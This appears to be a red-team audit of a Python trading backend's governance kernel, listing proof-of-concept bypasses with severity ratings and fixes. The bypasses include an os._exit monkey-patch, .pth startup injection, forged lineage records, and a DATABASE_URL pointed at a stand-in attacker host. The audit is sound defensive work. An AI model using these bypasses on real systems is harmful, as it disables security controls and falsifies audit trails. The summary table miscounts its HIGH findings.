# Red Team Audit — MCAS Governance Kernel
**Date:** 2026-03-15
**Auditor:** Claude (adversarial mode)
**Scope:** governance/kernel/ — FrozenRegistry, ImportGuard, CI Gates, Lineage Enforcement, Operational

---

## Attack Surface 1: FrozenRegistry Bypass

### Attack 1.1: Extract `_entries` dict before freeze
**Target:** FrozenRegistry
**Method:** Access `self._entries` dict during OPEN phase, before `_freeze()` is called. Since `_entries` is a regular dict, any code with a reference to the registry during population can read/write it.
**Result:** PARTIAL
**Evidence:**
```python
# In a populator callable:
def evil_populator(reg):
    reg._register("legit_key", "legit_value")
    # _entries is a plain dict, accessible:
    stolen = reg._entries  # Works — it's a normal attribute
    stolen["injected"] = "evil"  # Modifies the dict pre-freeze
    # When _freeze() runs, "injected" will be promoted to an attribute
```
**Severity:** MEDIUM
**Why not CRITICAL:** Populators are canonical functions defined in `governance/bootstrap.py`. An attacker would need to modify the populator source, which CI gates would review. However, if any populator passes the registry reference to another function, that function can mutate `_entries`.
**Fix:** Deep-copy or wrap `_entries` in a guarded proxy, or use `_register()` as the sole mutation path by making `_entries` a private non-dict structure. Alternatively: validate `_entries` keys match expected manifest before freeze.

---

### Attack 1.2: Read `__dict__` on frozen instance
**Target:** FrozenRegistry
**Method:** After freeze, entries are promoted to instance attributes. `instance.__dict__` exposes them all.
**Result:** BYPASSED (read-only — no mutation)
**Evidence:**
```python
# __dict__ is accessible on any Python object (unless __slots__ is used)
# FrozenRegistry does NOT use __slots__
registry.__dict__  # Returns all attributes including promoted entries

# CI gates catch __dict__ access (DUNDER_DICT_ACCESS rule)
# BUT: vars(registry) is also caught (VARS_INTROSPECTION)
# AND: dir(registry) is NOT caught — shows all attribute names

# The real bypass: operator.attrgetter
import operator
getter = operator.attrgetter('D1')
value = getter(registry)  # Works — bypasses getattr CI gate
```
**Severity:** LOW (read-only access doesn't break governance; the values are meant to be read)
**Fix:** Add `__slots__` to FrozenRegistry. This eliminates `__dict__` entirely. Note: would require reworking the promote-to-attributes pattern.

---

### Attack 1.3: Catch the kill — monkey-patch `os._exit`
**Target:** FrozenRegistry, ImportGuard, RuntimeGraphSeal, LineageEnforcer
**Method:** Replace `os._exit` before the kernel loads.
**Result:** BYPASSED
**Evidence:**
```python
# Attack: In a sitecustomize.py or .pth file (loaded before any application code):
import os
_real_exit = os._exit
os._exit = lambda code: None  # Swallow all governance kills

# Now ALL governance enforcement becomes advisory:
# - Missing registry keys → prints error, continues
# - Import boundary violations → prints error, continues
# - Lineage mismatches → prints error, continues

# CI gates catch this? Let's check:
# - "os._exit" is not in the CI gate rules
# - The assignment `os._exit = lambda code: None` is:
#   - An ast.Attribute assignment, not covered by DUNDER_REASSIGNMENT (not a dunder)
#   - Not caught by RUNTIME_SETATTR (it's not using setattr())
#   - Not caught by any existing rule
```
**Severity:** CRITICAL
**Why CRITICAL:** This is a single-point-of-failure. The entire governance kernel relies on `os._exit(78)` being uncatchable. If it's patched, ALL enforcement becomes print statements.

**Additional bypass — ctypes:**
```python
# Even more stealthy: replace at C level
import ctypes
libc = ctypes.CDLL("libc.so.6")
# Can't easily prevent this, but CI gates DO catch ctypes if it's imported normally
# However: __import__('ctypes') is caught by DYNAMIC_IMPORT
# And: eval("__imp" + "ort__('ctypes')") is caught by DYNAMIC_CODE_EXEC
```

**Additional bypass — subprocess fork:**
```python
import subprocess
# Fork a child, let it die from os._exit, parent continues
result = subprocess.run([
    "python3", "-c",
    "from governance.bootstrap import bootstrap_genesis; bootstrap_genesis()"
], capture_output=True)
# Parent is not subject to governance at all
```
**Fix:**
1. Add CI gate rule: `OS_EXIT_REASSIGNMENT` — flag any assignment to `os._exit`, `os.exit`, or `sys.exit`.
2. At kernel bootstrap, verify `os._exit` identity: `assert os._exit.__module__ == 'nt' or os._exit.__module__ == 'posix'` (or check it's a builtin).
3. Consider using `signal.signal(signal.SIGABRT, ...)` + `os.abort()` as a secondary kill — harder to monkey-patch.
4. Scan `.pth` files and `sitecustomize.py` in CI.

---

### Attack 1.4: `object.__setattr__` via exec
**Target:** FrozenRegistry frozen state
**Method:** Construct the forbidden call as a string and execute it.
**Result:** BLOCKED by CI gates
**Evidence:**
```python
# Direct approach:
exec("object.__setattr__(registry, 'D1', 'evil')")
# CI gates catch: DYNAMIC_CODE_EXEC for exec()
# No EXEMPT comment is honoured for this rule (N/A in exemption column)

# String concatenation:
eval("objec" + "t.__setat" + "tr__(reg, 'key', 'val')")
# CI gates catch: DYNAMIC_CODE_EXEC for eval()
# N/A — no exemption possible
```
**Severity:** N/A (blocked)
**Mechanism:** CI gate rule `DYNAMIC_CODE_EXEC` catches `eval()`, `exec()`, `compile()` with NO exemption path.

---

### Attack 1.5: `__class__` assignment to swap frozen for unfrozen
**Target:** FrozenRegistry frozen state
**Method:** Change the instance's class to one without `__setattr__` guard.
**Result:** PARTIAL
**Evidence:**
```python
class UnfrozenDoppelganger:
    pass

# Direct assignment:
registry.__class__ = UnfrozenDoppelganger
# FrozenRegistry.__setattr__ intercepts this → os._exit(78) (post-freeze)

# But wait — __class__ is a dunder. CI gates catch DUNDER_REASSIGNMENT:
# "ClassName.__method__ = ..." but skip "self.__dunder__ = ..."
# This is NOT self — it's an external target. So:
# registry.__class__ = X → DUNDER_REASSIGNMENT violation AND __setattr__ kill
```
**Severity:** N/A (blocked at both runtime and CI)
**Mechanism:** `__setattr__` guard kills process; CI gate catches dunder reassignment on non-self.

---

### Attack 1.6: Race the freeze — thread injection
**Target:** FrozenRegistry during population window
**Method:** Between `_register()` calls and `_freeze()`, inject entries from another thread.
**Result:** BYPASSED
**Evidence:**
```python
import threading

def evil_injector(reg):
    import time
    time.sleep(0.001)  # Wait for populator to start
    reg._entries["backdoor"] = {"type": "evil", "payload": "..."}
    # _entries is a plain dict. No lock protects it.
    # If timed right, "backdoor" gets promoted to an attribute at freeze time.

# In bootstrap:
t = threading.Thread(target=evil_injector, args=(config_reg,))
t.start()
_populate_config(config_reg)  # Legitimate population
config_reg._freeze()  # "backdoor" is now a frozen attribute
```
**Severity:** HIGH
**Why HIGH:** The window is real (between registry creation and freeze). However, exploitation requires code execution during bootstrap, which means the attacker already has write access to the bootstrap module or a populator.
**Fix:** Add a threading lock to `_register()` and `_entries`, or validate the key manifest after population (expected keys list).

---

### Attack 1.7: `pickle` / `copy` to extract state
**Target:** FrozenRegistry
**Method:** Use pickle or copy to create a mutable clone.
**Result:** PARTIAL
**Evidence:**
```python
import copy

# copy.copy uses __dict__ internally:
clone = copy.copy(registry)
# FrozenRegistry.__getattr__ returns AttributeError for underscore attrs
# So pickle/copy CAN access internal state

# BUT: the clone is a new FrozenRegistry with _frozen=True
# clone.__setattr__ still kills on mutation
# HOWEVER: clone._entries is a reference to the original's _entries
# After freeze, _entries still exists on the instance (it's never deleted)

# Reading is possible:
clone._entries  # Contains all original entries
# But _entries has underscore prefix → __getattr__ raises AttributeError, not os._exit

# Wait — _entries IS an underscore attribute. Let's check __getattr__:
# Line 152: if name.startswith('_'): raise AttributeError(...)
# So _entries access after freeze raises AttributeError, not kills.
# This is CAUGHT by try/except AttributeError (if you use one)

# Actually: _entries is set via object.__setattr__ in __init__
# It remains on __dict__ even after freeze
# Direct dict access: registry.__dict__['_entries'] ← caught by CI gate (DUNDER_DICT_ACCESS)
```
**Severity:** LOW
**Fix:** Delete `_entries` from the instance dict during `_freeze()` (after promoting to attributes).

---

## Attack Surface 2: Import Guard Bypass

### Attack 2.1: Remove the hook from sys.meta_path
**Target:** Import boundary enforcement
**Method:** `sys.meta_path.remove()` or list manipulation.
**Result:** BLOCKED by CI gates
**Evidence:**
```python
# Direct removal:
sys.meta_path.remove(sys.meta_path[0])
# CI gate: META_PATH_ACCESS catches any sys.meta_path reference

# Sneaky list comprehension:
sys.meta_path[:] = [x for x in sys.meta_path if type(x).__name__ != '_BoundaryEnforcer']
# CI gate: META_PATH_ACCESS still catches sys.meta_path

# Via getattr:
getattr(sys, 'meta_path')  # SILENT_GETATTR if 3 args, but 2 args is not caught
meta = getattr(sys, 'meta_path')  # 2-arg getattr is NOT caught by CI gates
meta.clear()  # Removes all finders including the guard
```
**Severity:** HIGH (the 2-arg getattr bypass works at CI level)
**Evidence (working bypass):**
```python
# This passes CI gates:
mp = getattr(sys, 'meta_path')  # 2-arg getattr not flagged
mp.clear()  # All finders removed — stdlib imports break too, but...
mp.extend(original_finders_without_guard)  # Restore non-guard finders
# Now core_logic can import from governance freely
```
**Fix:** CI gate should catch ALL `getattr` calls on `sys` object, or catch any attribute access pattern that resolves to `sys.meta_path` (e.g., indirect via variable). Simpler: add a rule that flags `getattr(sys, ...)` regardless of arg count.

---

### Attack 2.2: Import without triggering find_spec
**Target:** Import guard hook
**Method:** Use low-level importlib APIs that bypass `sys.meta_path`.
**Result:** BLOCKED (mostly)
**Evidence:**
```python
# importlib.import_module — caught by CI gate RUNTIME_IMPORT
import importlib
importlib.import_module('governance.signal_worker')

# __import__ — caught by CI gate DYNAMIC_IMPORT
__import__('governance.signal_worker')

# importlib.util path — let's trace:
# importlib.util.find_spec() DOES call sys.meta_path hooks
# So this is NOT a bypass — the guard sees it

# exec("from governance import X", globals()) — caught by DYNAMIC_CODE_EXEC
```
**Severity:** N/A (blocked)

---

### Attack 2.3: Confuse caller detection via crafted globals
**Target:** Import guard stack walker
**Method:** The guard reads `frame.f_globals.get("__name__")` to determine the caller module. Craft a frame with a fake `__name__`.
**Result:** BYPASSED
**Evidence:**
```python
# In core_logic/some_file.py (normally blocked from importing governance):

# This is caught by DYNAMIC_CODE_EXEC:
# exec("from governance.signal_worker import process_signal",
#      {"__name__": "governance.internal"})

# BUT: What about importlib with indirect module loading?
# Actually, the real bypass is simpler:

# 1. Create a module-level function in a governance/ file that returns what you need
# 2. Call it from core_logic — this is a FUNCTION call, not an import
# The import guard only blocks import statements, not function calls across boundaries

# Wait — core_logic CAN'T import governance to call its functions
# That's the whole point. But if governance has already exported something
# into a shared namespace (like a builtins injection or sys.modules entry)...

# Actually the exec approach would work if CI gates didn't catch it.
# Since DYNAMIC_CODE_EXEC has NO exemption, this is blocked.
```
**Severity:** N/A (blocked by CI gates, but see Attack 2.4)

---

### Attack 2.4: Pre-loaded module in sys.modules
**Target:** Import guard — find_spec bypass
**Method:** If `governance.signal_worker` is already in `sys.modules` (loaded by governance itself), does a subsequent import from `core_logic` trigger `find_spec`?
**Result:** BYPASSED
**Evidence:**
```python
# Python import machinery:
# When you do `from governance.signal_worker import X`:
# 1. Python checks sys.modules first
# 2. If found → uses cached module, does NOT call find_spec
# 3. find_spec is only called for NEW imports

# Verification from CPython source (importlib._bootstrap._find_and_load):
# if name in sys.modules:
#     module = sys.modules[name]
#     return module  # <-- find_spec never called

# Attack scenario:
# 1. Worker process bootstraps → governance.signal_worker is imported → in sys.modules
# 2. Some core_logic code later does: from governance.signal_worker import X
# 3. Python finds it in sys.modules → returns cached module
# 4. _BoundaryEnforcer.find_spec is NEVER called
# 5. Import succeeds silently

# Practical limitation: core_logic modules are typically imported BEFORE
# governance modules in the bootstrap sequence. But in a long-running process,
# if core_logic code is lazily loaded after bootstrap, this works.

# Concrete PoC:
# governance/worker.py (runs at startup):
#   from governance.signal_worker import process_signal  # loads into sys.modules
#
# Later, in a dynamically loaded core_logic path:
#   from governance.signal_worker import process_signal  # sys.modules hit, no find_spec
```
**Severity:** HIGH
**Fix:** The import guard should ALSO install a `sys.modules` wrapper or use `importlib.abc.Loader` to intercept the exec_module phase. Alternatively: verify at freeze time that no `core_logic` module has references to `governance` objects (via a recursive `gc.get_referrers()` check — though this is expensive).

A simpler fix: in `find_spec`, also check if the module is already in `sys.modules` AND the caller is forbidden:
```python
def find_spec(self, fullname, path, target=None):
    # ... existing logic ...
    # Even if module is cached, enforce boundary:
    if fullname in sys.modules:
        # Still check caller boundary
        caller_root = ...
        if forbidden:
            os._exit(78)
```
Wait — `find_spec` is never called if the module is already in `sys.modules`. The fix must be at a different level: either a custom `__import__` wrapper (which CI gates would flag), or using `importlib.abc.MetaPathFinder.find_module` (deprecated but sometimes called), or installing a module `__getattr__` on governance modules.

Best fix: Add a post-bootstrap verification pass that scans all loaded `core_logic` module namespaces for governance references.

---

## Attack Surface 3: CI Gates Bypass

### Attack 3.1: Construct forbidden calls dynamically
**Target:** AST scanner
**Method:** Use string operations to avoid AST detection.
**Result:** BLOCKED
**Evidence:**
```python
# eval("getat" + "tr(obj, 'key', None)")
# CI gate: DYNAMIC_CODE_EXEC catches eval() — NO exemption

# builtins path:
# builtins = __builtins__
# builtins.__dict__['getattr'](obj, 'key', None)
# CI gate: DUNDER_DICT_ACCESS catches .__dict__
# AND: would need # EXEMPT: comment to pass

# String import + attribute chain:
# getattr(__builtins__, 'getattr')(obj, 'key', None)
# CI gate: SILENT_GETATTR catches 3-arg getattr on outer call
# BUT: the inner getattr(__builtins__, 'getattr') is only 2 args — NOT caught
# The result function is then called with (obj, 'key', None)
# This call is NOT getattr at AST level — it's a Call on a Name that isn't "getattr"
#
# Wait: getattr(__builtins__, 'getattr') returns the getattr function
# Assigning it: ga = getattr(__builtins__, 'getattr')
# CI gate: BUILTIN_ALIAS catches `ga = getattr` but NOT `ga = getattr(...)` (different AST)
# The assignment value is a Call node, not a Name node. BUILTIN_ALIAS only checks Name nodes.

# WORKING BYPASS:
result = getattr(__builtins__, 'getattr')(obj, 'key', None)
# - getattr(__builtins__, 'getattr') → 2-arg, not SILENT_GETATTR
# - The resulting call is a Call on a Call, not on a Name — not caught
# - No DYNAMIC_CODE_EXEC, no BUILTIN_ALIAS
```
**Severity:** HIGH
**Fix:** BUILTIN_ALIAS should check `ast.Call` nodes on the right-hand side too, not just `ast.Name`. Also add a rule that flags `getattr(__builtins__, ...)` specifically.

---

### Attack 3.2: EXEMPT comment escape hatch abuse
**Target:** CI gate exemption system
**Method:** Add `# EXEMPT: legitimate use` to any line.
**Result:** BYPASSED (for exemptible rules)
**Evidence:**
```python
# The _has_exempt_comment function (ci_gates.py:111-116):
def _has_exempt_comment(source: str, lineno: int) -> bool:
    lines = source.splitlines()
    if 0 < lineno <= len(lines):
        return "# EXEMPT:" in lines[lineno - 1]
    return False

# There is NO validation of the exemption reason.
# Any string after "# EXEMPT:" is accepted:
getattr(registry, 'secret', None)  # EXEMPT: totally legitimate I promise

# Rules that honour EXEMPT:
# SILENT_GETATTR, HASATTR_DISPATCH, RUNTIME_SETATTR, DYNAMIC_DISPATCH,
# RUNTIME_IMPORT, GETATTRIBUTE_BYPASS, VARS_INTROSPECTION,
# SILENT_ATTR_FALLBACK, DUNDER_DICT_ACCESS, FROZEN_BYPASS_SETATTR,
# META_PATH_ACCESS, SYS_PATH_ACCESS

# Rules that do NOT honour EXEMPT (N/A):
# DYNAMIC_CODE_EXEC, DYNAMIC_IMPORT, BARE_EXCEPT,
# GOVERNANCE_EXCEPTION_CATCH, BUILTIN_ALIAS

# So you CAN exempt:
object.__setattr__(registry, 'key', 'evil')  # EXEMPT: need to fix a thing
sys.meta_path.clear()  # EXEMPT: testing
hasattr(obj, 'secret')  # EXEMPT: compatibility
```
**Severity:** HIGH
**Why HIGH:** The EXEMPT mechanism has no validation. Any developer (or CC instance) can add `# EXEMPT:` with any reason string. Code review is the only gate, and it's human-dependent.
**Fix:**
1. Require EXEMPT reasons to match a whitelist of approved patterns.
2. Log all EXEMPT usages to a governance audit file.
3. Require EXEMPT comments to reference a ticket/issue number.
4. Add a CI step that counts EXEMPT usages and fails if count exceeds a threshold.
5. Make FROZEN_BYPASS_SETATTR and META_PATH_ACCESS non-exemptible (like DYNAMIC_CODE_EXEC).

---

### Attack 3.3: Write to a scanner-skipped file
**Target:** CI gate file exclusions
**Method:** Place governed code in a file that the scanner skips.
**Result:** BYPASSED
**Evidence:**
```python
# FULLY_EXEMPT_FILES = {"ci_gates.py", "conftest.py", "import_guard.py"}
# Files matching test_* prefix are exempt

# Attack: Create governance/test_helper.py with forbidden code:
# governance/test_helper.py:
import os
os._exit = lambda code: None  # Disable all governance kills
from governance.bootstrap import _LINEAGE  # Direct singleton access

# Then in governed code:
# governance/some_worker.py:
from governance.test_helper import _LINEAGE  # Legal import (same package)

# CI gates skip test_helper.py entirely (_is_fully_exempt returns True)
# The import guard allows governance → governance (same root)

# ALSO: conftest.py is exempt. You can create governance/conftest.py
# with any forbidden code and import from it.
```
**Severity:** CRITICAL
**Why CRITICAL:** Any file named `test_*.py` or `conftest.py` in ANY directory (including `governance/`) is fully exempt from all CI gates. This is a trivial, zero-skill bypass.
**Fix:**
1. Only exempt test files that are UNDER a `tests/` directory: `_is_fully_exempt` should check the full path, not just the filename.
2. `conftest.py` exemption should only apply to files in test directories.
3. Add a CI rule that no production code (non-test directories) may import from `test_*` or `conftest` files.

---

### Attack 3.4: Bypass at the git hook level
**Target:** CI pipeline
**Method:** Modify non-`.py` files that affect Python imports.
**Result:** BYPASSED
**Evidence:**
```bash
# 1. .pth files: Python loads .pth files from site-packages at startup
# Create: /usr/local/lib/python3.12/site-packages/evil.pth
# Contents:
# import os; os._exit = lambda c: None
# .pth files with "import" lines are executed at interpreter startup
# CI gates only scan .py files — .pth files are invisible

# 2. sitecustomize.py: Automatically imported at startup
# Place in site-packages or PYTHONPATH
# Can monkey-patch anything before application code loads
# CI gates don't scan non-Backend .py files

# 3. Direct .pyc commit:
# Compile forbidden code to .pyc, commit the .pyc
# Python loads .pyc if present (and newer than .py)
# CI gates skip __pycache__/ directories explicitly
# If you place a .pyc in a non-__pycache__ location, it won't load normally
# BUT: if __pycache__/module.cpython-312.pyc is committed and .py is clean,
# Python uses the .pyc (checks timestamp/hash)

# 4. .cfg / pyproject.toml:
# Add a custom import hook via setuptools entry_points
# CI gates don't scan these files
```
**Severity:** MEDIUM
**Why not CRITICAL:** These attacks require write access to the Docker image or build process, not just the application codebase. In a containerized environment, the attack surface is the Dockerfile.
**Fix:**
1. Scan for `.pth` files in Docker images during build.
2. Add `PYTHONDONTWRITEBYTECODE=1` to Docker env (already common).
3. Add `-B` flag to Python invocations.
4. In bootstrap, verify `os._exit` hasn't been patched (identity check).

---

### Attack 3.5: Features the AST scanner doesn't know about
**Target:** CI gate coverage gaps
**Method:** Use Python features that achieve forbidden effects through unchecked patterns.
**Result:** BYPASSED (multiple vectors)
**Evidence:**

**Vector A: `operator.attrgetter`**
```python
import operator
# operator.attrgetter is NOT in any CI gate rule
getter = operator.attrgetter('_entries')
entries = getter(registry)  # Equivalent to getattr(registry, '_entries')
# Bypasses: SILENT_GETATTR, DUNDER_DICT_ACCESS
```

**Vector B: `functools.reduce` with `getattr`**
```python
import functools
# Aliasing getattr through reduce — not caught by BUILTIN_ALIAS
# (BUILTIN_ALIAS only catches direct assignment `x = getattr`)
value = functools.reduce(getattr, ['signal_worker'], __import__('governance'))
# Combines DYNAMIC_IMPORT (__import__) which IS caught
# But without __import__:
import governance
value = functools.reduce(getattr, ['signal_worker'], governance)
# reduce(getattr, ...) is NOT caught by any rule
# getattr appears as argument to reduce, not as a Call node
```

**Vector C: Descriptor protocol**
```python
class EvilDescriptor:
    def __get__(self, obj, objtype=None):
        # This internally uses attribute access however it wants
        return obj.__dict__  # Inside a __get__, CI won't flag obj.__dict__
        # Wait — CI gates scan ALL code, including inside methods
        # So __dict__ IS flagged. But with # EXEMPT: descriptor protocol ...
        pass  # EXEMPT-able vector

class EvilMixin:
    secret = EvilDescriptor()
    # secret.fget effectively runs __get__ which can do anything
```

**Vector D: `type()` metaclass construction**
```python
# Dynamically create a class without CI-visible code:
EvilClass = type('EvilClass', (object,), {
    '__getattr__': lambda self, name: 'bypassed',
    '__setattr__': lambda self, name, value: object.__setattr__(self, name, value),
})
# type() as a 3-arg call is NOT caught by any CI gate rule
# It's not eval/exec/compile, not __import__, not getattr
# The lambdas inside the dict contain object.__setattr__ —
# BUT: lambdas in a dict literal might not be AST-visited correctly
# Actually they are — the visitor does generic_visit which recurses.
# So object.__setattr__ inside the lambda IS caught by FROZEN_BYPASS_SETATTR.
# But the __getattr__ lambda is not caught (it's a method definition, not a call).
```

**Vector E: `collections.namedtuple` / `dataclasses.fields`**
```python
from dataclasses import fields, asdict
# If a registry value is a dataclass:
# fields(registry.D1) → all field objects
# asdict(registry.D1) → full dict copy
# Neither is caught by CI gates (no __dict__, no getattr, no vars)
# This is fine for VALUES but not for the registry itself
```
**Severity:** MEDIUM (operator.attrgetter is the most practical vector)
**Fix:** Add CI gate rules for:
1. `operator.attrgetter` / `operator.itemgetter`
2. `functools.reduce(getattr, ...)` pattern
3. `type()` with 3 arguments (metaclass construction)

---

## Attack Surface 4: Lineage Enforcement Bypass

### Attack 4.1: Read and replay the seal
**Target:** LineageEnforcer
**Method:** Compute or read the seal and stamp it on ungoverned records.
**Result:** BYPASSED
**Evidence:**
```python
# The seal is DETERMINISTIC — same config → same seal across runs
# It's computed from the registry contents, which are defined in source code
# (governance/bootstrap.py populators)

# Where is the seal readable?
# 1. stderr at bootstrap time:
#    [BOOTSTRAP] Runtime graph sealed: abc123def456...
#    [BOOTSTRAP] Process ID: 1a2b3c4d5e6f7g8h
# 2. In the database: SELECT DISTINCT runtime_graph_seal FROM opportunities
# 3. In Redis: any signal/payload carries the seal
# 4. Via API: if any endpoint exposes lineage info

# Attack: read seal from DB, stamp on manual inserts
seal = "abc123..."  # Copied from logs or DB
process_id = "1a2b3c4d5e6f7g8h"  # Copied from logs or DB
epoch = 1710460800.0  # Copied from logs or DB

# Direct SQL insert with forged lineage:
INSERT INTO opportunities (
    setup_id, symbol, timeframe, direction,
    runtime_graph_seal, process_id, bootstrap_epoch
) VALUES (
    'D1', 'BTCUSDT', '1h', 'long',
    'abc123...', '1a2b3c4d5e6f7g8h', 1710460800.0
);
# Looks identical to a governed record
```
**Severity:** HIGH
**Fix:**
1. Include a per-record nonce or HMAC in the lineage stamp (seal + record_id + secret).
2. Add a DB trigger that validates lineage via a secret only the application knows.
3. Use `process_id` uniqueness: since `process_id = hash(seal + epoch)[:16]`, a replayed seal with the wrong epoch produces the wrong process_id. But the attacker can replay BOTH.

---

### Attack 4.2: Skip the check — write without GovernedPersistence
**Target:** Lineage enforcement gap
**Method:** Use `PersistenceClient` directly (it doesn't enforce lineage).
**Result:** BYPASSED
**Evidence:**
```python
from governance.persistence import PersistenceClient

# PersistenceClient has NO lineage enforcement
# It's a plain SQL wrapper:
PersistenceClient.execute_query(
    "INSERT INTO opportunities (setup_id, symbol, direction) VALUES (%s, %s, %s)",
    ('D1', 'BTCUSDT', 'long')
)
# runtime_graph_seal, process_id, bootstrap_epoch are all NULL
# The DB accepts this because columns are nullable

# Even get_conn() works:
from governance.persistence import get_conn
with get_conn() as conn:
    with conn.cursor() as cur:
        cur.execute("INSERT INTO opportunities (...) VALUES (...)")
    conn.commit()
# No lineage stamped, no lineage checked
```
**Severity:** CRITICAL
**Why CRITICAL:** `PersistenceClient` is a public class in `governance/persistence.py`. Any governed code can import and use it to bypass lineage entirely. The lineage columns are nullable in the DB. There is no constraint preventing NULL lineage.
**Fix:**
1. Make lineage columns NOT NULL with a CHECK constraint: `ALTER TABLE opportunities ALTER COLUMN runtime_graph_seal SET NOT NULL;`
2. Remove `PersistenceClient` or make it private. All persistence should go through `GovernedPersistence`.
3. Add a DB trigger: `CREATE TRIGGER enforce_lineage BEFORE INSERT ON opportunities FOR EACH ROW WHEN (NEW.runtime_graph_seal IS NULL) EXECUTE FUNCTION reject_unlineaged();`

---

### Attack 4.3: Forge the Lineage object
**Target:** Lineage dataclass
**Method:** Manually construct a Lineage with the correct seal.
**Result:** BYPASSED
**Evidence:**
```python
from governance.kernel.runtime_graph import Lineage

# Lineage is a frozen dataclass — but nothing prevents construction
forged = Lineage(
    runtime_graph_seal="real_seal_copied_from_db",
    registry_seals=(("config", "fake"), ("strategy", "fake")),
    bootstrap_epoch=1710460800.0,
    process_id="real_pid_from_db",
)

# Now create a LineageEnforcer with the forged lineage:
from governance.kernel.bootstrap import LineageEnforcer

class FakeWorker(LineageEnforcer):
    def __init__(self):
        super().__init__(forged)

worker = FakeWorker()
record = {}
worker.stamp_lineage(record)
# record now has valid-looking lineage stamps
```
**Severity:** HIGH
**Fix:** Lineage construction should require a proof-of-work: a value that can only be computed by the legitimate bootstrap process (e.g., a hash that includes a process-local secret generated at bootstrap time and stored only in memory).

---

## Attack Surface 5: Operational Bypasses

### Attack 5.1: Direct database writes
**Target:** Entire governance layer
**Method:** `psql` or `docker exec` to write directly to the database.
**Result:** BYPASSED
**Evidence:**
```bash
# From the host or within the Docker network:
docker exec backend-postgres-1 psql -U trading -d trading -c "
INSERT INTO opportunities (
    setup_id, symbol, timeframe, direction, score, decision_ts, created_at
) VALUES (
    'D1', 'BTCUSDT', '1h', 'long', 99.9, NOW(), NOW()
);
"
# runtime_graph_seal = NULL, process_id = NULL, bootstrap_epoch = NULL
# The INSERT succeeds — no NOT NULL constraint, no CHECK, no trigger.

# Or with forged lineage:
docker exec backend-postgres-1 psql -U trading -d trading -c "
SELECT DISTINCT runtime_graph_seal, process_id, bootstrap_epoch
FROM opportunities
WHERE runtime_graph_seal IS NOT NULL
LIMIT 1;
"
# Copy those values into the INSERT — record is indistinguishable from governed.
```
**Severity:** CRITICAL
**Fix:** DB-level enforcement is the only real fix:
1. `NOT NULL` constraints on lineage columns
2. A CHECK constraint or trigger that validates the seal format (64-char hex)
3. `pg_hba.conf` restrictions limiting which users/hosts can INSERT
4. A read-only DB user for debugging, separate from the application user

---

### Attack 5.2: Environment variable injection
**Target:** Bootstrap configuration
**Method:** Override Docker environment at runtime.
**Result:** BYPASSED (changes config without changing seal)
**Evidence:**
```bash
# Docker Compose override:
docker compose run -e DATABASE_URL=postgres://attacker:pass@evil-host/db worker
# Bootstrap reads os.getenv('DATABASE_URL') → gets attacker's value
# Seal changes because config content changes
# But: the SEAL IS DERIVED FROM THE VALUES, so a changed env DOES change the seal
# This means workers with different env won't accept each other's payloads
# (peer shunning works correctly here)

# However: if you change a value that doesn't affect behavior but does affect seal:
docker compose run -e SOME_UNUSED_VAR=changed worker
# Wait — only registered config values go into the seal.
# Unregistered env vars are ignored by bootstrap.
# So changing non-registered vars has NO effect — correct behaviour.

# The real attack: change a value that DOES affect behavior in a desired way
docker compose run -e KNOWN_UNIVERSE_SIZE=9999 worker
# This changes the seal → peer shunning catches it
# But: if ALL workers are restarted with this env, they all get the same seal
# The system is consistently wrong but doesn't detect it
```
**Severity:** LOW
**Why LOW:** Peer shunning correctly detects environment changes between workers. The attack only works if you control ALL workers' environments, at which point you control the system anyway.

---

### Attack 5.3: Hot-patching a running container
**Target:** Module-level singletons
**Method:** `docker exec` to inject Python code into a running process.
**Result:** PARTIAL
**Evidence:**
```bash
# docker exec runs a NEW process — it doesn't inject into the running worker
docker exec -it worker python3 -c "
import governance.bootstrap
print(governance.bootstrap._LINEAGE)
"
# This starts a NEW Python interpreter. It can READ _LINEAGE but can't affect
# the running worker process. The worker is a separate PID.

# To actually hot-patch:
# 1. Use gdb to attach to the running Python process
# 2. Use pyrasite to inject code into a running interpreter
# 3. Write to shared memory / Unix socket that the worker reads

# These are OS-level attacks that no Python governance can prevent.
# But they require root access to the container.

# More practical: modify the source files and wait for a restart
docker exec worker python3 -c "
import pathlib
pathlib.Path('/backend/governance/bootstrap.py').write_text(
    pathlib.Path('/backend/governance/bootstrap.py').read_text().replace(
        'os._exit(78)', 'pass  # neutered'
    )
)
"
# On next restart, governance is disabled.
# But this modifies committed files, detectable by git.
```
**Severity:** LOW (requires container root access, which is game-over anyway)

---

### Attack 5.4: Stale `__pycache__` from pre-governance code
**Target:** CI gates, runtime enforcement
**Method:** Pre-compiled `.pyc` files that predate governance enforcement.
**Result:** BYPASSED (if conditions met)
**Evidence:**
```bash
# Scenario: governance kernel was added AFTER the codebase had existing .pyc files
# If a stale .pyc for governance/bootstrap.py exists from before the kernel was added,
# Python MAY load it instead of the .py source

# Python checks: if .pyc timestamp >= .py timestamp → use .pyc
# Docker: typically builds from scratch → no stale .pyc
# But: if volumes mount the host directory (dev mode), stale .pyc can persist

# CI gates explicitly skip __pycache__/ (ci_gates.py line 392):
# if any(p.startswith('.') or p in ('__pycache__',) for p in parts): continue

# So .pyc files are NEVER scanned by CI gates.
# If a .pyc contains pre-governance code, Python happily loads it.

# Fix verification:
# Check if PYTHONDONTWRITEBYTECODE=1 is set in Dockerfiles
# Check if .dockerignore excludes __pycache__
```
**Severity:** MEDIUM (primarily a dev-environment risk)
**Fix:**
1. Set `PYTHONDONTWRITEBYTECODE=1` in all Dockerfiles
2. Add `__pycache__/` to `.dockerignore`
3. Add `find . -name __pycache__ -exec rm -rf {} +` to Docker build
4. Use `python -B` flag

---

## Summary — Findings by Severity

### CRITICAL (3)

| # | Attack | Target | Vector |
|---|--------|--------|--------|
| 1.3 | os._exit monkey-patch | All enforcement | `os._exit = lambda c: None` before bootstrap |
| 3.3 | test_ file exemption | CI gates | Put forbidden code in `test_helper.py`, import from governed code |
| 4.2 | PersistenceClient bypass | Lineage enforcement | Write to DB via PersistenceClient (no lineage) with nullable columns |

### HIGH (6)

| # | Attack | Target | Vector |
|---|--------|--------|--------|
| 1.6 | Race the freeze | FrozenRegistry | Thread injection into _entries during population window |
| 2.1 | 2-arg getattr on sys | Import guard | `getattr(sys, 'meta_path')` bypasses CI META_PATH_ACCESS |
| 2.4 | sys.modules cache | Import guard | Pre-loaded modules skip find_spec entirely |
| 3.1 | getattr(__builtins__) | CI gates | Indirection through builtins bypasses BUILTIN_ALIAS |
| 3.2 | EXEMPT abuse | CI gates | No validation of exemption reasons |
| 4.1 | Seal replay | Lineage | Deterministic seal readable from DB/logs/stderr |
| 4.3 | Forge Lineage | Lineage | Lineage() constructor has no access control |
